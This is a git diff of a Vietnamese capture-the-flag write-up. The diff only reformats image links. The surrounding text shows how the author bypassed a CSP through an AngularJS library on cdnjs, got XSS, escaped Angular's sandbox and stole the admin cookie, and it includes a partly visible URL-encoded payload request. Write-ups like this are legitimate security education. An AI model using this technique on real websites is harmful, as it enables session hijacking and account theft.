@@ -4,13 +4,13 @@ Tài liệu/Bài báo tham khảo:
 https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/
 
 ---
-![[Pasted image 20261012221259.png]]
+![Pasted image 20261012221259](Attachments/Pasted%20image%2020261012221259.png)
 
 Challenge khá thú vị khi cho chúng ta một chức năng để Echo tất cả những gì ta nhập ra Client-side.
 
 Không biết do mình gà hay CLB troll nhưng mà mình thấy bài này không easy với mình cho lắm 😭
 
-![[Pasted image 20261012221429.png]]
+![Pasted image 20261012221429](Attachments/Pasted%20image%2020261012221429.png)
 
 Có thể thấy, website đang sử dụng CSP:
 
@@ -18,11 +18,11 @@ Có thể thấy, website đang sử dụng CSP:
 default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: *;
 ```
 
-![[Pasted image 20261012222613.png]]
+![Pasted image 20261012222613](Attachments/Pasted%20image%2020261012222613.png)
 
 Ngoài chính trang web thì `<script>` còn cho phép nguồn từ cdnjs. Như trang web bên trên phân tích thì CSP thường bị Bypass từ source này.
 
-![[Pasted image 20261012224810.png]]
+![Pasted image 20261012224810](Attachments/Pasted%20image%2020261012224810.png)
 
 Mình lên mạng tìm một lúc thì thấy một bài báo nói về điều này, copy payload của họ vào thì gặp XSS thật kaka.
 Payload:
@@ -35,7 +35,7 @@ Payload:
 ```
 Bạn có thể đọc thêm tại: https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/ để hiểu cách nó hoạt động nhé.
 
-![[Pasted image 20261012225006.png]]
+![Pasted image 20261012225006](Attachments/Pasted%20image%2020261012225006.png)
 
 Giờ mình chỉ việc sửa payload một chút để ăn cắp cookie của Admin là xong:
 
@@ -47,7 +47,7 @@ Nếu nó không được... Sau một lúc lâu test và có sự trợ giúp c
 
 Nhưng đời lại không như mơ... Hình như bị sandbox nên mình không đọc được cookie, localStorage hay thậm chí cả DOM. Đến lúc này mình tự hỏi không biết có đang đi sai hướng không 😭 Bài Easy chắc không đến mức độ này chứ.
 
-![[Pasted image 20261013111244.png]]
+![Pasted image 20261013111244](Attachments/Pasted%20image%2020261013111244.png)
 
 
 Sau đó mình tìm mãi mới nhận ra lý do không đọc được cookie và tìm được cách để thoát ra khỏi Sandbox của Angular sau đó thành công lấy được cookie của Admin 😭
@@ -65,4 +65,4 @@ http://web/index.php?msg=%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com
 ```
 
 
-![[Pasted image 20261013112459.png]]
+![Pasted image 20261013112459](Attachments/Pasted%20image%2020261013112459.png)
